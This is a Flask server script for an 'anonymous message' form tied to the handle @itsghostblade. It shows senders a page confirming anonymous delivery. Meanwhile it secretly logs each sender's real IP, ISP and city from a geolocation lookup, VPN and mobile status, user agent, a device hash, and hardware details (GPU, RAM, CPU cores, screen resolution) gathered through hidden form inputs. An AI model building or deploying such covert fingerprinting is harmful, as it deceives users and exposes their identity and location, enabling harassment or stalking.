from flask import Flask, request, render_template_string
from flask_cors import CORS
import datetime
import requests

app = Flask(__name__)
# CORS allows your GitHub Pages site to communicate with this Render server
CORS(app)

# The "Success" page displayed to the sender
SUCCESS_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Message Sent</title>
    <style>
        body { background: #fafafa; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: white; padding: 40px; border-radius: 35px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); text-align: center; border-top: 6px solid #FE2F78; width: 320px; }
        h1 { color: #FE2F78; margin-bottom: 10px; font-size: 24px; }
        p { color: #666; font-size: 1rem; line-height: 1.5; }
    </style>
</head>
<body>
    <div class="box">
        <h1>✅ Sent!</h1>
        <p>Your anonymous message has been delivered to @itsghostblade</p>
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return "Backend is Active. Awaiting POST requests at /submit", 200

@app.route('/submit', methods=['POST'])
def submit():
    try:
        # 1. Capture the message and User-Agent (Device Model Info)
        msg = request.form.get('message', 'Empty')
        ua = request.headers.get('User-Agent', 'Unknown Browser')
        
        # 2. Capture the Unique Device Hash from the HTML script
        dev_hash = request.form.get('device_hash', 'No-Hash-Found')
        
        # 3. Get Real IP (Handles Render's proxy headers)
        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
        
        # 4. ISP & Location Lookup
        network_info = "Lookup Failed"
        try:
            # Using ip-api for high accuracy in India
            response = requests.get(f"http://ip-api.com/json/{ip}?fields=status,isp,city,regionName,mobile,proxy", timeout=5)
            data = response.json()
            if data.get('status') == 'success':
                is_mobile = "YES" if data.get('mobile') else "NO"
                is_vpn = "YES" if data.get('proxy') else "NO"
                network_info = f"{data.get('isp')} ({data.get('city')}, {data.get('regionName')}) | Mobile: {is_mobile} | VPN: {is_vpn}"
        except:
            pass

        # 5. Get Hardware Specs from HTML hidden inputs
        gpu = request.form.get('gpu', 'Unknown')
        res = request.form.get('res', 'Unknown')
        ram = request.form.get('ram', 'Unknown')
        cores = request.form.get('cores', 'Unknown')

        # 6. Format the Log Entry
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        log_report = (
            f"\n{'='*60}\n"
            f"🎯 NEW MESSAGE RECEIVED: {timestamp}\n"
            f"{'-'*60}\n"
            f"🔑 DEVICE HASH: {dev_hash}\n"
            f"💬 MESSAGE:     {msg}\n"
            f"📱 USER-AGENT:  {ua}\n"
            f"🌐 NETWORK:     IP: {ip} | {network_info}\n"
            f"⚙️ HARDWARE:    GPU: {gpu} | RAM: {ram}GB | CPU: {cores} Cores | RES: {res}\n"
            f"{'='*60}\n"
        )

        # 7. Print to Render Logs
        print(log_report)

        return render_template_string(SUCCESS_PAGE)

    except Exception as e:
        print(f"ERROR: {e}")
        return "Internal Server Error", 500

if __name__ == "__main__":
    app.run()
